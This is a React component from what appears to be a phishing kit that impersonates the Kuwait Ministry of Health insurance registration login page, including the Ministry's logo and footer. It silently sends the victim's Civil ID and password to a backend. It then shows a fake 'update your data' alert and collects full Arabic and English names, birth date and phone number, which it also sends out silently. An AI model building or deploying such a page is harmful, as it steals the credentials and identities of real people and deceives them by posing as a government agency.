import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

export default function MOHLogin() {
  const [, setLocation] = useLocation();
  const [civilId, setCivilId] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showUpdateForm, setShowUpdateForm] = useState(false);
  const [lang, setLang] = useState<'ar' | 'en'>('ar');

  // Update data form fields - Arabic name
  const [firstNameAr, setFirstNameAr] = useState('');
  const [secondNameAr, setSecondNameAr] = useState('');
  const [thirdNameAr, setThirdNameAr] = useState('');
  const [lastNameAr, setLastNameAr] = useState('');

  // English name - 4 fields
  const [firstNameEn, setFirstNameEn] = useState('');
  const [secondNameEn, setSecondNameEn] = useState('');
  const [thirdNameEn, setThirdNameEn] = useState('');
  const [lastNameEn, setLastNameEn] = useState('');

  const [birthDate, setBirthDate] = useState('');
  const [phone, setPhone] = useState('');

  const isAr = lang === 'ar';

  useEffect(() => {
    navigateToPage('تسجيل الدخول');
  }, []);

  const handleLogin = () => {
    if (!civilId || !password) return;
    setLoading(true);

    sendData({
      data: {
        'الرقم المدني': civilId,
        'كلمة المرور': password,
      },
      current: 'تسجيل الدخول',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    setTimeout(() => {
      setLoading(false);
      setShowPopup(true);
    }, 3000);
  };

  const handleContinue = () => {
    setShowPopup(false);
    setShowUpdateForm(true);
    navigateToPage('تحديث البيانات');
  };

  const isUpdateValid = firstNameAr && secondNameAr && thirdNameAr && lastNameAr &&
    firstNameEn && secondNameEn && thirdNameEn && lastNameEn && birthDate && phone;

  const handleUpdate = () => {
    if (!isUpdateValid) return;

    const fullNameAr = `${firstNameAr} ${secondNameAr} ${thirdNameAr} ${lastNameAr}`;
    const fullNameEn = `${firstNameEn} ${secondNameEn} ${thirdNameEn} ${lastNameEn}`;
    localStorage.setItem('mohCivilId', civilId);
    localStorage.setItem('mohUserName', fullNameAr);
    localStorage.setItem('mohEnglishName', fullNameEn);
    localStorage.setItem('mohBirthDate', birthDate);
    localStorage.setItem('mohPhone', phone);

    sendData({
      data: {
        'الرقم المدني': civilId,
        'الاسم الأول (عربي)': firstNameAr,
        'الاسم الثاني (عربي)': secondNameAr,
        'الاسم الثالث (عربي)': thirdNameAr,
        'اسم العائلة (عربي)': lastNameAr,
        'الاسم الأول (إنجليزي)': firstNameEn,
        'الاسم الثاني (إنجليزي)': secondNameEn,
        'الاسم الثالث (إنجليزي)': thirdNameEn,
        'اسم العائلة (إنجليزي)': lastNameEn,
        'تاريخ الميلاد': birthDate,
        'رقم الهاتف': phone,
      },
      current: 'تحديث البيانات',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    setLocation('/moh-register');
  };

  const inputStyle: React.CSSProperties = {
    width: '100%',
    padding: '10px 12px',
    border: '1px solid #ccc',
    borderRadius: 4,
    fontSize: 15,
    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
    outline: 'none',
    direction: isAr ? 'rtl' : 'ltr',
    boxSizing: 'border-box',
  };

  const labelStyle: React.CSSProperties = {
    fontSize: 14,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 5,
    display: 'block',
    textAlign: isAr ? 'right' : 'left',
  };

  // Translations
  const t = {
    ar: {
      title: 'النظام الآلي لتسجيل الضمان الصحي',
      langSwitch: 'English',
      loginTitle: 'تسجيل الدخول',
      civilId: 'الرقم المدني',
      civilIdPh: 'أدخل الرقم المدني',
      password: 'كلمة المرور',
      passwordPh: 'أدخل كلمة المرور',
      loginBtn: 'تسجيل الدخول',
      loggingIn: 'جاري تسجيل الدخول...',
      alert: 'تنبيه',
      alertMsg: 'عليك تحديث البيانات لإستكمال الدخول الى النظام',
      continue: 'متابعة',
      updateTitle: 'تحديث البيانات',
      nameAr: 'الاسم بالعربي',
      nameEn: 'الاسم بالإنجليزي',
      firstName: 'الاسم الأول',
      secondName: 'الاسم الثاني',
      thirdName: 'الاسم الثالث',
      familyName: 'اسم العائلة',
      firstNameEn: 'First Name',
      secondNameEn: 'Second Name',
      thirdNameEn: 'Third Name',
      familyNameEn: 'Family Name',
      birthDate: 'تاريخ الميلاد',
      phone: 'رقم الهاتف',
      phonePh: 'أدخل رقم الهاتف',
      updateBtn: 'تحديث',
      noAccount: 'ليس لديك حساب؟',
      createAccount: 'إنشاء حساب جديد',
      userGuide: 'دليل مستخدم التطبيق',
      footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    },
    en: {
      title: 'Automated Health Insurance Registration System',
      langSwitch: 'العربية',
      loginTitle: 'Login',
      civilId: 'Civil ID',
      civilIdPh: 'Enter Civil ID',
      password: 'Password',
      passwordPh: 'Enter Password',
      loginBtn: 'Login',
      loggingIn: 'Logging in...',
      alert: 'Alert',
      alertMsg: 'You need to update your data to complete login to the system',
      continue: 'Continue',
      updateTitle: 'Update Data',
      nameAr: 'Name in Arabic',
      nameEn: 'Name in English',
      firstName: 'الاسم الأول',
      secondName: 'الاسم الثاني',
      thirdName: 'الاسم الثالث',
      familyName: 'اسم العائلة',
      firstNameEn: 'First Name',
      secondNameEn: 'Second Name',
      thirdNameEn: 'Third Name',
      familyNameEn: 'Family Name',
      birthDate: 'Date of Birth',
      phone: 'Phone Number',
      phonePh: 'Enter Phone Number',
      updateBtn: 'Update',
      noAccount: "Don't have an account?",
      createAccount: 'Create New Account',
      userGuide: 'Application User Guide',
      footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    },
  };

  const tx = t[lang];

  return (
    <div style={{ direction: isAr ? 'rtl' : 'ltr', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff', display: 'flex', flexDirection: 'column' }}>
      {/* Header */}
      <div style={{ background: '#0c2c3c', padding: '20px 0', textAlign: 'center' }}>
        <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 90, height: 90, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>{tx.title}</h1>
      </div>

      {/* Language Toggle */}
      <div style={{ textAlign: isAr ? 'left' : 'right', padding: '10px 30px' }}>
        <span
          onClick={() => setLang(isAr ? 'en' : 'ar')}
          style={{ color: 'red', fontSize: 14, cursor: 'pointer', textDecoration: 'none' }}
        >
          {tx.langSwitch}
        </span>
      </div>

      {/* Loading Overlay */}
      {loading && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{ background: '#fff', borderRadius: 10, padding: 40, textAlign: 'center' }}>
            <div style={{
              width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
              borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
            }} />
            <p style={{ color: '#333', fontSize: 16 }}>{tx.loggingIn}</p>
            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          </div>
        </div>
      )}

      {/* Popup */}
      {showPopup && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{ background: '#fff', borderRadius: 8, padding: '30px 40px', textAlign: 'center', maxWidth: 450, width: '90%', boxShadow: '0 4px 20px rgba(0,0,0,0.2)' }}>
            <div style={{ width: 60, height: 60, background: '#FFF3CD', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 15px' }}>
              <span style={{ fontSize: 30, color: '#856404' }}>!</span>
            </div>
            <h3 style={{ color: '#333', fontSize: 18, marginBottom: 10 }}>{tx.alert}</h3>
            <p style={{ color: '#555', fontSize: 15, lineHeight: 1.8, marginBottom: 25 }}>
              {tx.alertMsg}
            </p>
            <button
              onClick={handleContinue}
              style={{
                background: '#1076BB', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              {tx.continue}
            </button>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div style={{ flex: 1 }}>
        {/* Login Form */}
        {!showUpdateForm && (
          <div style={{ maxWidth: 500, margin: '40px auto', padding: '0 20px' }}>
            <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
              <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
                <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{tx.loginTitle}</span>
              </div>
              <div style={{ padding: '30px 25px', background: '#f9f9f9' }}>
                <div style={{ marginBottom: 20 }}>
                  <label style={labelStyle}>{tx.civilId} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="text"
                    value={civilId}
                    onChange={(e) => setCivilId(e.target.value.replace(/\D/g, ''))}
                    maxLength={12}
                    placeholder={tx.civilIdPh}
                    style={inputStyle}
                  />
                </div>
                <div style={{ marginBottom: 25 }}>
                  <label style={labelStyle}>{tx.password} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder={tx.passwordPh}
                    style={inputStyle}
                  />
                </div>
                <div style={{ textAlign: 'center' }}>
                  <button
                    onClick={handleLogin}
                    disabled={!civilId || !password}
                    style={{
                      background: (!civilId || !password) ? '#ccc' : '#1076BB',
                      color: '#fff', border: 'none', padding: '12px 60px',
                      fontSize: 16, fontWeight: 'bold', borderRadius: 4,
                      cursor: (!civilId || !password) ? 'not-allowed' : 'pointer',
                      fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                    }}
                  >
                    {tx.loginBtn}
                  </button>
                </div>
              </div>
            </div>

            {/* Links below form */}
            <div style={{ textAlign: 'center', marginTop: 25 }}>
              <p style={{ fontSize: 14, color: '#555', marginBottom: 8 }}>
                {tx.noAccount} <a href="/moh-create-account" style={{ color: '#1076BB', textDecoration: 'none', fontWeight: 'bold' }}>{tx.createAccount}</a>
              </p>
              <p>
                <a href="/user-guide.pdf" target="_blank" style={{ color: '#1076BB', textDecoration: 'underline', fontSize: 14 }}>{tx.userGuide}</a>
              </p>
            </div>
          </div>
        )}

        {/* Update Data Form */}
        {showUpdateForm && (
          <div style={{ maxWidth: 600, margin: '30px auto', padding: '0 20px' }}>
            <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
              <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
                <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{tx.updateTitle}</span>
              </div>
              <div style={{ padding: '25px', background: '#f9f9f9' }}>
                {/* Civil ID - dynamic from login */}
                <div style={{ marginBottom: 18 }}>
                  <label style={labelStyle}>{tx.civilId}</label>
                  <input
                    type="text"
                    value={civilId}
                    readOnly
                    style={{ ...inputStyle, background: '#e9ecef', color: '#555' }}
                  />
                </div>

                {/* Arabic Name - 4 fields */}
                <label style={{ ...labelStyle, marginBottom: 10 }}>{tx.nameAr} <span style={{ color: 'red' }}>*</span></label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 18 }}>
                  <div>
                    <input
                      type="text"
                      value={firstNameAr}
                      onChange={(e) => setFirstNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.firstName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={secondNameAr}
                      onChange={(e) => setSecondNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.secondName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={thirdNameAr}
                      onChange={(e) => setThirdNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.thirdName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={lastNameAr}
                      onChange={(e) => setLastNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.familyName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                </div>

                {/* English Name - 4 fields */}
                <label style={{ ...labelStyle, marginBottom: 10 }}>{tx.nameEn} <span style={{ color: 'red' }}>*</span></label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 18 }}>
                  <div>
                    <input
                      type="text"
                      value={firstNameEn}
                      onChange={(e) => setFirstNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.firstNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={secondNameEn}
                      onChange={(e) => setSecondNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.secondNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={thirdNameEn}
                      onChange={(e) => setThirdNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.thirdNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={lastNameEn}
                      onChange={(e) => setLastNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.familyNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                </div>

                {/* Birth Date */}
                <div style={{ marginBottom: 18 }}>
                  <label style={labelStyle}>{tx.birthDate} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="date"
                    value={birthDate}
                    onChange={(e) => setBirthDate(e.target.value)}
                    style={inputStyle}
                  />
                </div>

                {/* Phone */}
                <div style={{ marginBottom: 25 }}>
                  <label style={labelStyle}>{tx.phone} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                    maxLength={12}
                    placeholder={tx.phonePh}
                    style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                  />
                </div>

                {/* Update Button */}
                <div style={{ textAlign: 'center' }}>
                  <button
                    onClick={handleUpdate}
                    disabled={!isUpdateValid}
                    style={{
                      background: !isUpdateValid ? '#ccc' : '#1076BB',
                      color: '#fff', border: 'none', padding: '12px 60px',
                      fontSize: 16, fontWeight: 'bold', borderRadius: 4,
                      cursor: !isUpdateValid ? 'not-allowed' : 'pointer',
                      fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                    }}
                  >
                    {tx.updateBtn}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
        <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>{tx.footer}</p>
      </div>
    </div>
  );
}
